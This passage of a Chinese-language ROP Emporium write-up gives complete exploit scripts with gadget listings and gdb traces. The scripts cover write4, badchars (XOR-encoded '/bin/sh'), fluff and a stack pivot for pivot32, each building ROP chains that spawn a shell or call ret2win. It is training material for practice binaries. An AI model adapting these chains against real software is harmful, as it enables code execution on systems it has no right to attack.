\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u627e\u5230\u6211\u4eec\u9700\u8981\u7684 gadgets\uff1a $ ropgadget --binary write432 --only \"mov|pop|ret\" ... 0x08048670 : mov dword ptr [edi], ebp ; ret 0x080486da : pop edi ; pop ebp ; ret \u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd9\u91cc\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u6bcf\u6b21\u53ea\u80fd\u5199\u5165 4 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8981\u5206\u6210\u4e24\u6b21\u5199\u5165\uff0c\u8fd8\u5f97\u6ce8\u610f\u5b57\u7b26\u5bf9\u9f50\uff0c\u6709\u6ca1\u6709\u622a\u65ad\u5b57\u7b26\uff08 \\x00 , \\x0a \u7b49\uff09\u4e4b\u7c7b\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u8fd9\u91cc /bin/sh \u53ea\u6709\u4e03\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 /bin/sh\\00 \u6216\u8005 /bin//sh \uff0c\u6784\u9020 payload \u5982\u4e0b\uff1a from zio import * pop_edi_ebp = 0x080486da mov_edi_ebp = 0x08048670 data_addr = 0x804a028 system_plt = 0x8048430 payload = \"\" payload += \"A\"*44 payload += l32(pop_edi_ebp) payload += l32(data_addr) payload += \"/bin\" payload += l32(mov_edi_ebp) payload += l32(pop_edi_ebp) payload += l32(data_addr+4) payload += \"/sh\\x00\" payload += l32(mov_edi_ebp) payload += l32(system_plt) payload += \"BBBB\" payload += l32(data_addr) io = zio('./write432') io.writeline(payload) io.interact() $ python2 run.py AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(/binp,/shp0BBBB(\ufffd write4 by ROP Emporium 32bits Go ahead and give me the string already! > cat flag.txt ROPE{a_placeholder_32byte_flag!} write4 64 \u4f4d\u7a0b\u5e8f\u5c31\u53ef\u4ee5\u4e00\u6b21\u6027\u5199\u5165\u4e86\u3002 $ ropgadget --binary write4 --only \"mov|pop|ret\" ... 0x0000000000400820 : mov qword ptr [r14], r15 ; ret 0x0000000000400890 : pop r14 ; pop r15 ; ret 0x0000000000400893 : pop rdi ; ret from pwn import * pop_r14_r15 = 0x0000000000400890 mov_r14_r15 = 0x0000000000400820 pop_rdi = 0x0000000000400893 data_addr = 0x0000000000601050 system_plt = 0x004005e0 payload = \"A\"*40 payload += p64(pop_r14_r15) payload += p64(data_addr) payload += \"/bin/sh\\x00\" payload += p64(mov_r14_r15) payload += p64(pop_rdi) payload += p64(data_addr) payload += p64(system_plt) io = process('./write4') io.recvuntil('>') io.sendline(payload) io.interactive() badchars32 \u5728\u8fd9\u4e2a\u6311\u6218\u4e2d\uff0c\u6211\u4eec\u4f9d\u7136\u8981\u5c06 /bin/sh \u5199\u5165\u5230\u8fdb\u7a0b\u5185\u5b58\u4e2d\uff0c\u4f46\u8fd9\u4e00\u6b21\u7a0b\u5e8f\u5728\u8bfb\u53d6\u8f93\u5165\u65f6\u4f1a\u5bf9\u654f\u611f\u5b57\u7b26\u8fdb\u884c\u68c0\u67e5\uff0c\u67e5\u770b\u51fd\u6570 checkBadchars() \uff1a gdb-peda$ disassemble checkBadchars Dump of assembler code for function checkBadchars: 0x08048801 <+0>: push ebp 0x08048802 <+1>: mov ebp,esp 0x08048804 <+3>: sub esp,0x10 0x08048807 <+6>: mov BYTE PTR [ebp-0x10],0x62 0x0804880b <+10>: mov BYTE PTR [ebp-0xf],0x69 0x0804880f <+14>: mov BYTE PTR [ebp-0xe],0x63 0x08048813 <+18>: mov BYTE PTR [ebp-0xd],0x2f 0x08048817 <+22>: mov BYTE PTR [ebp-0xc],0x20 0x0804881b <+26>: mov BYTE PTR [ebp-0xb],0x66 0x0804881f <+30>: mov BYTE PTR [ebp-0xa],0x6e 0x08048823 <+34>: mov BYTE PTR [ebp-0x9],0x73 0x08048827 <+38>: mov DWORD PTR [ebp-0x4],0x0 0x0804882e <+45>: mov DWORD PTR [ebp-0x8],0x0 0x08048835 <+52>: mov DWORD PTR [ebp-0x4],0x0 0x0804883c <+59>: jmp 0x804887c <checkBadchars+123> 0x0804883e <+61>: mov DWORD PTR [ebp-0x8],0x0 0x08048845 <+68>: jmp 0x8048872 <checkBadchars+113> 0x08048847 <+70>: mov edx,DWORD PTR [ebp+0x8] 0x0804884a <+73>: mov eax,DWORD PTR [ebp-0x4] 0x0804884d <+76>: add eax,edx 0x0804884f <+78>: movzx edx,BYTE PTR [eax] 0x08048852 <+81>: lea ecx,[ebp-0x10] 0x08048855 <+84>: mov eax,DWORD PTR [ebp-0x8] 0x08048858 <+87>: add eax,ecx 0x0804885a <+89>: movzx eax,BYTE PTR [eax] 0x0804885d <+92>: cmp dl,al 0x0804885f <+94>: jne 0x804886e <checkBadchars+109> 0x08048861 <+96>: mov edx,DWORD PTR [ebp+0x8] 0x08048864 <+99>: mov eax,DWORD PTR [ebp-0x4] 0x08048867 <+102>: add eax,edx 0x08048869 <+104>: mov BYTE PTR [eax],0xeb 0x0804886c <+107>: jmp 0x8048878 <checkBadchars+119> 0x0804886e <+109>: add DWORD PTR [ebp-0x8],0x1 0x08048872 <+113>: cmp DWORD PTR [ebp-0x8],0x7 0x08048876 <+117>: jbe 0x8048847 <checkBadchars+70> 0x08048878 <+119>: add DWORD PTR [ebp-0x4],0x1 0x0804887c <+123>: mov eax,DWORD PTR [ebp-0x4] 0x0804887f <+126>: cmp eax,DWORD PTR [ebp+0xc] 0x08048882 <+129>: jb 0x804883e <checkBadchars+61> 0x08048884 <+131>: nop 0x08048885 <+132>: leave 0x08048886 <+133>: ret End of assembler dump. \u5f88\u660e\u663e\uff0c\u5730\u5740 0x08048807 \u5230 0x08048823 \u7684\u5b57\u7b26\u5c31\u662f\u6240\u8c13\u7684\u654f\u611f\u5b57\u7b26\u3002\u5904\u7406\u654f\u611f\u5b57\u7b26\u5728\u5229\u7528\u5f00\u53d1\u4e2d\u662f\u7ecf\u5e38\u8981\u7528\u5230\u7684\uff0c\u4e0d\u4ec5\u4ec5\u662f\u8981\u5bf9\u53c2\u6570\u8fdb\u884c\u7f16\u7801\uff0c\u6709\u65f6\u751a\u81f3\u5730\u5740\u4e5f\u8981\u5982\u6b64\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u7b80\u5355\u7684\u5f02\u6216\u64cd\u4f5c\u6765\u5bf9\u5b57\u7b26\u4e32\u7f16\u7801\u548c\u89e3\u7801\u3002 \u627e\u5230 gadgets\uff1a $ ropgadget --binary badchars32 --only \"mov|pop|ret|xor\" ... 0x08048893 : mov dword ptr [edi], esi ; ret 0x08048896 : pop ebx ; pop ecx ; ret 0x08048899 : pop esi ; pop edi ; ret 0x08048890 : xor byte ptr [ebx], cl ; ret \u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5c31\u662f\u5199\u5165\u524d\u7f16\u7801\uff0c\u4f7f\u7528\u524d\u89e3\u7801\uff0c\u4e0b\u9762\u662f payload\uff1a from zio import * xor_ebx_cl = 0x08048890 pop_ebx_ecx = 0x08048896 pop_esi_edi = 0x08048899 mov_edi_esi = 0x08048893 system_plt = 0x080484e0 data_addr = 0x0804a038 # encode badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73] xor_byte = 0x1 while(1): binsh = \"\" for i in \"/bin/sh\\x00\": c = ord(i) ^ xor_byte if c in badchars: xor_byte += 1 break else: binsh += chr(c) if len(binsh) == 8: break # write payload = \"A\"*44 payload += l32(pop_esi_edi) payload += binsh[:4] payload += l32(data_addr) payload += l32(mov_edi_esi) payload += l32(pop_esi_edi) payload += binsh[4:8] payload += l32(data_addr + 4) payload += l32(mov_edi_esi) # decode for i in range(len(binsh)): payload += l32(pop_ebx_ecx) payload += l32(data_addr + i) payload += l32(xor_byte) payload += l32(xor_ebx_cl) # run payload += l32(system_plt) payload += \"BBBB\" payload += l32(data_addr) io = zio('./badchars32') io.writeline(payload) io.interact() badchars 64 \u4f4d\u7a0b\u5e8f\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u6ce8\u610f\u53c2\u6570\u4f20\u9012\u5c31\u597d\u4e86\u3002 $ ropgadget --binary badchars --only \"mov|pop|ret|xor\" ... 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret 0x0000000000400b3b : pop r12 ; pop r13 ; ret 0x0000000000400b40 : pop r14 ; pop r15 ; ret 0x0000000000400b30 : xor byte ptr [r15], r14b ; ret 0x0000000000400b39 : pop rdi ; ret from pwn import * pop_r12_r13 = 0x0000000000400b3b mov_r13_r12 = 0x0000000000400b34 pop_r14_r15 = 0x0000000000400b40 xor_r15_r14b = 0x0000000000400b30 pop_rdi = 0x0000000000400b39 system_plt = 0x00000000004006f0 data_addr = 0x0000000000601000 badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73] xor_byte = 0x1 while(1): binsh = \"\" for i in \"/bin/sh\\x00\": c = ord(i) ^ xor_byte if c in badchars: xor_byte += 1 break else: binsh += chr(c) if len(binsh) == 8: break payload = \"A\"*40 payload += p64(pop_r12_r13) payload += binsh payload += p64(data_addr) payload += p64(mov_r13_r12) for i in range(len(binsh)): payload += p64(pop_r14_r15) payload += p64(xor_byte) payload += p64(data_addr + i) payload += p64(xor_r15_r14b) payload += p64(pop_rdi) payload += p64(data_addr) payload += p64(system_plt) io = process('./badchars') io.recvuntil('>') io.sendline(payload) io.interactive() fluff32 \u8fd9\u4e2a\u7ec3\u4e60\u4e0e\u4e0a\u9762\u6ca1\u6709\u592a\u5927\u533a\u522b\uff0c\u96be\u70b9\u5728\u4e8e\u6211\u4eec\u80fd\u627e\u5230\u7684 gadgets \u4e0d\u662f\u90a3\u4e48\u76f4\u63a5\uff0c\u6709\u4e00\u4e2a\u6280\u5de7\u662f\u56e0\u4e3a\u6211\u4eec\u7684\u76ee\u7684\u662f\u5199\u5165\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u5fc5\u7136\u9700\u8981 mov [reg], reg \u8fd9\u6837\u7684 gadgets\uff0c\u6211\u4eec\u5c31\u4ece\u8fd9\u91cc\u51fa\u53d1\uff0c\u5012\u63a8\u6240\u9700\u7684 gadgets\u3002 $ ropgadget --binary fluff32 --only \"mov|pop|ret|xor|xchg\" ... 0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret 0x080483e1 : pop ebx ; ret 0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret 0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret 0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret \u6211\u4eec\u770b\u5230\u4e00\u4e2a\u8fd9\u6837\u7684 mov dword ptr [ecx], edx ; \uff0c\u53ef\u4ee5\u60f3\u5230\u6211\u4eec\u5c06\u5730\u5740\u653e\u8fdb ecx \uff0c\u5c06\u6570\u636e\u653e\u8fdb edx \uff0c\u4ece\u800c\u5c06\u6570\u636e\u5199\u5165\u5230\u5730\u5740\u4e2d\u3002payload \u5982\u4e0b\uff1a from zio import * system_plt = 0x08048430 data_addr = 0x0804a028 pop_ebx = 0x080483e1 mov_ecx_edx = 0x08048693 xchg_edx_ecx = 0x08048689 xor_edx_ebx = 0x0804867b xor_edx_edx = 0x08048671 def write_data(data, addr): # addr -> ecx payload = l32(xor_edx_edx) payload += \"BBBB\" payload += l32(pop_ebx) payload += l32(addr) payload += l32(xor_edx_ebx) payload += \"BBBB\" payload += l32(xchg_edx_ecx) payload += \"BBBB\" # data -> edx payload += l32(xor_edx_edx) payload += \"BBBB\" payload += l32(pop_ebx) payload += data payload += l32(xor_edx_ebx) payload += \"BBBB\" # edx -> [ecx] payload += l32(mov_ecx_edx) payload += \"BBBB\" payload += l32(0) return payload payload = \"A\"*44 payload += write_data(\"/bin\", data_addr) payload += write_data(\"/sh\\x00\", data_addr + 4) payload += l32(system_plt) payload += \"BBBB\" payload += l32(data_addr) io = zio('./fluff32') io.writeline(payload) io.interact() fluff \u63d0\u793a\uff1a\u5728\u4f7f\u7528 ropgadget \u641c\u7d22\u65f6\u52a0\u4e0a\u53c2\u6570 --depth \u53ef\u4ee5\u5f97\u5230\u66f4\u5927\u957f\u5ea6\u7684 gadgets\u3002 $ ropgadget --binary fluff --only \"mov|pop|ret|xor|xchg\" --depth 20 ... 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret 0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret from pwn import * system_plt = 0x004005e0 data_addr = 0x0000000000601050 xor_r11_r11 = 0x0000000000400822 xor_r11_r12 = 0x000000000040082f xchg_r11_r10 = 0x0000000000400840 mov_r10_r11 = 0x000000000040084c pop_r12 = 0x0000000000400832 def write_data(data, addr): # addr -> r10 payload = p64(xor_r11_r11) payload += \"BBBBBBBB\" payload += p64(pop_r12) payload += p64(addr) payload += p64(xor_r11_r12) payload += \"BBBBBBBB\" payload += p64(xchg_r11_r10) payload += \"BBBBBBBB\" # data -> r11 payload += p64(xor_r11_r11) payload += \"BBBBBBBB\" payload += p64(pop_r12) payload += data payload += p64(xor_r11_r12) payload += \"BBBBBBBB\" # r11 -> [r10] payload += p64(mov_r10_r11) payload += \"BBBBBBBB\"*2 payload += p64(0) return payload payload = \"A\"*40 payload += write_data(\"/bin/sh\\x00\", data_addr) payload += p64(system_plt) io = process('./fluff') io.recvuntil('>') io.sendline(payload) io.interactive() pivot32 \u8fd9\u662f\u6311\u6218\u7684\u6700\u540e\u4e00\u9898\uff0c\u96be\u5ea6\u7a81\u7136\u589e\u52a0\u3002\u9996\u5148\u662f\u52a8\u6001\u5e93\uff0c\u52a8\u6001\u5e93\u4e2d\u51fd\u6570\u7684\u76f8\u5bf9\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4e00\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u76f8\u5bf9\u4f4d\u7f6e\u5173\u7cfb\u5f97\u5230\u5176\u4ed6\u4efb\u610f\u51fd\u6570\u7684\u5730\u5740\u3002\u5728\u5f00\u542f ASLR \u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u5e93\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u5730\u5740\u662f\u53d8\u5316\u7684\uff0c\u4f46\u5e76\u4e0d\u5f71\u54cd\u5e93\u4e2d\u51fd\u6570\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u5148\u6cc4\u9732\u51fa\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5f97\u5230\u76ee\u6807\u51fd\u6570\u5730\u5740\u3002 \u901a\u8fc7\u5206\u6790\u6211\u4eec\u77e5\u9053\u8be5\u7a0b\u5e8f\u4ece\u52a8\u6001\u5e93 libpivot32.so \u4e2d\u5bfc\u5165\u4e86\u51fd\u6570 foothold_function() \uff0c\u4f46\u5728\u7a0b\u5e8f\u903b\u8f91\u4e2d\u5e76\u6ca1\u6709\u8c03\u7528\uff0c\u800c\u5728 libpivot32.so \u4e2d\u8fd8\u6709\u6211\u4eec\u9700\u8981\u7684\u51fd\u6570 ret2win() \u3002 \u73b0\u5728\u6211\u4eec\u77e5\u9053\u4e86\u53ef\u4ee5\u6cc4\u9732\u7684\u51fd\u6570 foothold_function() \uff0c\u90a3\u4e48\u600e\u4e48\u6cc4\u9732\u5462\u3002\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u7b80\u5355\u4ecb\u7ecd\u4e86\u5ef6\u65f6\u7ed1\u5b9a\u6280\u672f\uff0c\u5f53\u6211\u4eec\u5728\u8c03\u7528\u5982 func@plt() \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5c06\u771f\u6b63\u7684 func() \u51fd\u6570\u5730\u5740\u5199\u5165\u5230 GOT \u8868\u7684 func.got.plt \u4e2d\uff0c\u7136\u540e func@plt() \u6839\u636e func.got.plt \u8df3\u8f6c\u5230\u771f\u6b63\u7684 func() \u51fd\u6570\u4e0a\u53bb\u3002 \u6700\u540e\u662f\u8be5\u6311\u6218\u6700\u91cd\u8981\u7684\u90e8\u5206\uff0c\u7a0b\u5e8f\u8fd0\u884c\u6211\u4eec\u6709\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u5165\u88ab\u653e\u5728\u4e00\u4e2a\u7531 malloc() \u51fd\u6570\u5206\u914d\u7684\u5806\u4e0a\uff0c\u5f53\u7136\u4e3a\u4e86\u964d\u4f4e\u96be\u5ea6\uff0c\u7a0b\u5e8f\u7279\u5730\u5c06\u8be5\u5730\u5740\u6253\u5370\u4e86\u51fa\u6765\uff0c\u7b2c\u4e8c\u6b21\u7684\u8f93\u5165\u5219\u88ab\u653e\u5728\u4e00\u4e2a\u5927\u5c0f\u9650\u5236\u4e3a 13 \u5b57\u8282\u7684\u6808\u4e0a\uff0c\u8fd9\u4e2a\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u8ba9\u6211\u4eec\u6267\u884c\u5f88\u591a\u4e1c\u897f\uff0c\u6240\u4ee5\u9700\u8981\u8fd0\u7528 stack pivot\uff0c\u5373\u901a\u8fc7\u8986\u76d6\u8c03\u7528\u8005\u7684 ebp\uff0c\u5c06\u6808\u5e27\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u5730\u65b9\uff0c\u540c\u65f6\u63a7\u5236 eip\uff0c\u5373\u53ef\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\uff0c\u901a\u5e38\u7684 payload\uff08\u8fd9\u91cc\u79f0\u4e3a\u526fpayload\uff09 \u7ed3\u6784\u5982\u4e0b\uff1a buffer padding | fake ebp | leave;ret addr | \u8fd9\u6837\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5c31\u88ab\u8986\u76d6\u4e3a leave;ret \u6307\u4ee4\u7684\u5730\u5740\uff0c\u8fd9\u6837\u7a0b\u5e8f\u5728\u6267\u884c\u5b8c\u5176\u539f\u672c\u7684 leave;ret \u540e\uff0c\u53c8\u6267\u884c\u4e86\u4e00\u6b21 leave;ret\u3002 \u53e6\u5916 fake ebp \u6307\u5411\u6211\u4eec\u53e6\u4e00\u6bb5 payload\uff08\u8fd9\u91cc\u79f0\u4e3a\u4e3bpayload\uff09 \u7684 ebp\uff0c\u5373 \u4e3bpayload \u5730\u5740\u51cf 4 \u7684\u5730\u65b9\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5728\u6784\u9020 \u4e3bpayload \u65f6\u5728\u524d\u9762\u52a0 4 \u4e2a\u5b57\u8282\u7684 padding \u4f5c\u4e3a ebp\uff1a ebp | payload \u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u51fd\u6570\u7684\u5165\u53e3\u70b9\u901a\u5e38\u662f\uff1a push ebp mov ebp,esp leave \u6307\u4ee4\u76f8\u5f53\u4e8e\uff1a mov esp,ebp pop ebp ret \u6307\u4ee4\u4e3a\u76f8\u5f53\u4e8e\uff1a pop eip \u5982\u679c\u9047\u5230\u4e00\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u6bd4\u8f83\u5c0f\uff0c\u4e0d\u80fd\u5b8c\u6210\u5168\u90e8\u7684\u5de5\u4f5c\uff0c\u540c\u65f6\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u6216\u8005\u7cfb\u7edf\u5f00\u542f\u4e86 ASLR\uff0c\u4f46\u540c\u65f6\u5728\u7a0b\u5e8f\u7684\u53e6\u4e00\u4e2a\u5730\u65b9\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u53ef\u4ee5\u5199\u5165 payload\uff0c\u5e76\u4e14\u53ef\u6267\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06\u6808\u8f6c\u79fb\u5230\u90a3\u4e2a\u5730\u65b9\u53bb\u3002 \u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from pwn import * #context.log_level = 'debug' #context.terminal = ['konsole'] io = process('./pivot32') elf = ELF('./pivot32') libp = ELF('./libpivot32.so') leave_ret = 0x0804889f foothold_plt = elf.plt['foothold_function'] # 0x080485f0 foothold_got_plt = elf.got['foothold_function'] # 0x0804a024 pop_eax = 0x080488c0 pop_ebx = 0x08048571 mov_eax_eax = 0x080488c4 add_eax_ebx = 0x080488c7 call_eax = 0x080486a3 foothold_sym = libp.symbols['foothold_function'] ret2win_sym = libp.symbols['ret2win'] offset = int(ret2win_sym - foothold_sym) # 0x1f7 leakaddr = int(io.recv().split()[20], 16) # calls foothold_function() to populate its GOT entry, then queries that value into EAX #gdb.attach(io) payload_1 = p32(foothold_plt) payload_1 += p32(pop_eax) payload_1 += p32(foothold_got_plt) payload_1 += p32(mov_eax_eax) payload_1 += p32(pop_ebx) payload_1 += p32(offset) payload_1 += p32(add_eax_ebx) payload_1 += p32(call_eax) io.sendline(payload_1) # ebp = leakaddr-4, esp = leave_ret payload_2 = \"A\"*40 payload_2 += p32(leakaddr-4) + p32(leave_ret) io.sendline(payload_2) print io.recvall() \u8fd9\u91cc\u6211\u4eec\u5728 gdb \u4e2d\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u5728 pwnme() \u51fd\u6570\u7684 leave \u5904\u4e0b\u65ad\u70b9\uff1a gdb-peda$ b *0x0804889f Breakpoint 1 at 0x804889f gdb-peda$ c Continuing. [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0xffe7ec68 --> 0xf755cf0c --> 0x0 ESP: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EIP: 0x804889f (<pwnme+173>: leave) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048896 <pwnme+164>: call 0x80485b0 <fgets@plt> 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop => 0x804889f <pwnme+173>: leave 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 [------------------------------------stack-------------------------------------] 0000| 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0004| 0xffe7ec44 ('A' <repeats 36 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0008| 0xffe7ec48 ('A' <repeats 32 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0012| 0xffe7ec4c ('A' <repeats 28 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0016| 0xffe7ec50 ('A' <repeats 24 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0020| 0xffe7ec54 ('A' <repeats 20 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0024| 0xffe7ec58 ('A' <repeats 16 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0028| 0xffe7ec5c ('A' <repeats 12 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x0804889f in pwnme () gdb-peda$ x/10w 0xffe7ec68 0xffe7ec68: 0xf755cf0c 0x0804889f 0xf755000a 0x00000000 0xffe7ec78: 0x00000002 0x00000000 0x00000001 0xffe7ed44 0xffe7ec88: 0xf755cf10 0xf655d010 gdb-peda$ x/10w 0xf755cf0c 0xf755cf0c: 0x00000000 0x080485f0 0x080488c0 0x0804a024 0xf755cf1c: 0x080488c4 0x08048571 0x000001f7 0x080488c7 0xf755cf2c: 0x080486a3 0x0000000a \u6267\u884c\u7b2c\u4e00\u6b21 leave;ret \u4e4b\u524d\uff0c\u6211\u4eec\u770b\u5230 EBP \u6307\u5411 fake ebp\uff0c\u5373 0xf755cf0c \uff0cfake ebp \u6307\u5411 \u4e3bpayload \u7684 ebp\uff0c\u800c\u5728 fake ebp \u540e\u9762\u662f leave;ret \u7684\u5730\u5740 0x0804889f \uff0c\u5373\u8fd4\u56de\u5730\u5740\u3002 \u6267\u884c\u7b2c\u4e00\u6b21 leave\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0xf755cf0c --> 0x0 ESP: 0xffe7ec6c --> 0x804889f (<pwnme+173>: leave) EIP: 0x80488a0 (<pwnme+174>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop 0x804889f <pwnme+173>: leave => 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 0x80488a7 <uselessFunction+6>: call 0x80485f0 <foothold_function@plt> [------------------------------------stack-------------------------------------] 0000| 0xffe7ec6c --> 0x804889f (<pwnme+173>: leave) 0004| 0xffe7ec70 --> 0xf755000a --> 0x0 0008| 0xffe7ec74 --> 0x0 0012| 0xffe7ec78 --> 0x2 0016| 0xffe7ec7c --> 0x0 0020| 0xffe7ec80 --> 0x1 0024| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf (\"./pivot32\") 0028| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488a0 in pwnme () EBP \u7684\u503c 0xffe7ec68 \u88ab\u8d4b\u503c\u7ed9 ESP\uff0c\u7136\u540e\u4ece\u6808\u4e2d\u5f39\u51fa 0xf755cf0c \uff0c\u5373 fake ebp \u5e76\u8d4b\u503c\u7ed9 EBP\uff0c\u540c\u65f6 ESP+4= 0xffe7ec6c \uff0c\u6307\u5411\u7b2c\u4e8c\u6b21\u7684 leave\u3002 \u6267\u884c\u7b2c\u4e00\u6b21 ret\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0xf755cf0c --> 0x0 ESP: 0xffe7ec70 --> 0xf755000a --> 0x0 EIP: 0x804889f (<pwnme+173>: leave) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048896 <pwnme+164>: call 0x80485b0 <fgets@plt> 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop => 0x804889f <pwnme+173>: leave 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 [------------------------------------stack-------------------------------------] 0000| 0xffe7ec70 --> 0xf755000a --> 0x0 0004| 0xffe7ec74 --> 0x0 0008| 0xffe7ec78 --> 0x2 0012| 0xffe7ec7c --> 0x0 0016| 0xffe7ec80 --> 0x1 0020| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf (\"./pivot32\") 0024| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) 0028| 0xffe7ec8c --> 0xf655d010 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x0804889f in pwnme () EIP= 0x804889f \uff0c\u540c\u65f6 ESP+4\u3002 \u7b2c\u4e8c\u6b21 leave\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD 